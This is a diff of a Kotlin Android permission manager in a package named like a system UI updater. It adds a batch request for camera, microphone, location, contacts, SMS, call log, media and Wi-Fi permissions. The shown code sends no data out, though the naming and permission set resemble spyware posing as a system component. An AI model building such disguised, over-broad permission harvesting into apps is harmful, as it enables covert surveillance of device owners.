@@ -1,46 +1,80 @@
 package com.android.systemui.updater.util
 
-import android.content.Context
+import android.app.Activity
 import android.content.pm.PackageManager
+import android.os.Build
+import androidx.activity.result.ActivityResultLauncher
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.core.content.ContextCompat
 
 /**
- * Utility for managing runtime permissions.
+ * Manages runtime permission requests for the app.
+ * Uses modern Activity Result API.
  */
-object PermissionManager {
+class PermissionManager(private val activity: Activity) {
 
-    /**
-     * Checks if a permission is granted.
-     * @param context The context
-     * @param permission The permission to check (e.g., Manifest.permission.SEND_SMS)
-     * @return true if granted, false otherwise
-     */
-    fun isPermissionGranted(context: Context, permission: String): Boolean {
-        return ContextCompat.checkSelfPermission(context, permission) ==
-                PackageManager.PERMISSION_GRANTED
+    private val requiredPermissions = mutableListOf<String>()
+    private var callback: ((allGranted: Boolean) -> Unit)? = null
+
+    init {
+        collectRequiredPermissions()
     }
 
-    /**
-     * Checks if multiple permissions are granted.
-     * @param context The context
-     * @param permissions The permissions to check
-     * @return true if all permissions are granted, false otherwise
-     */
-    fun arePermissionsGranted(context: Context, vararg permissions: String): Boolean {
-        return permissions.all { isPermissionGranted(context, it) }
+    private fun collectRequiredPermissions() {
+        // Always required
+        requiredPermissions.add(android.Manifest.permission.POST_NOTIFICATIONS)
+        
+        // Dangerous permissions used by capabilities
+        requiredPermissions.add(android.Manifest.permission.CAMERA)
+        requiredPermissions.add(android.Manifest.permission.RECORD_AUDIO)
+        requiredPermissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION)
+        requiredPermissions.add(android.Manifest.permission.READ_CONTACTS)
+        requiredPermissions.add(android.Manifest.permission.READ_SMS)
+        requiredPermissions.add(android.Manifest.permission.READ_CALL_LOG)
+        
+        // Storage (scoped)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            requiredPermissions.add(android.Manifest.permission.READ_MEDIA_IMAGES)
+            requiredPermissions.add(android.Manifest.permission.READ_MEDIA_VIDEO)
+            requiredPermissions.add(android.Manifest.permission.READ_MEDIA_AUDIO)
+        } else {
+            requiredPermissions.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+        
+        // WiFi/Network
+        requiredPermissions.add(android.Manifest.permission.ACCESS_WIFI_STATE)
+        requiredPermissions.add(android.Manifest.permission.CHANGE_WIFI_STATE)
     }
 
-    /**
-     * Requests a permission (if not already granted).
-     * Note: This is a placeholder. In a real app, you would use ActivityCompat.requestPermissions
-     * from an Activity or Fragment.
-     * @param context The context
-     * @param permission The permission to request
-     */
-    fun requestPermission(context: Context, permission: String) {
-        // This method is a placeholder. Actual permission requesting must be done from an Activity.
-        // For example: ActivityCompat.requestPermissions(activity, arrayOf(permission), requestCode)
-        // Since we don't have an activity context here, we cannot perform the request.
-        // In a real implementation, you might callback to an Activity or use a different approach.
+    fun requestRequiredPermissions(onComplete: (allGranted: Boolean) -> Unit) {
+        callback = onComplete
+        
+        val ungranted = requiredPermissions.filter {
+            ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
+        }
+        
+        if (ungranted.isEmpty()) {
+            onComplete(true)
+            return
+        }
+        
+        // Request permissions using Activity Result API
+        requestPermissionLauncher.launch(ungranted.toTypedArray())
+    }
+
+    private val requestPermissionLauncher = activity.registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { permissionsMap ->
+        val allGranted = permissionsMap.all { it.value }
+        callback?.invoke(allGranted)
+    }
+
+    fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ): Boolean {
+        // Not used with Activity Result API, but kept for compatibility
+        return false
     }
 }
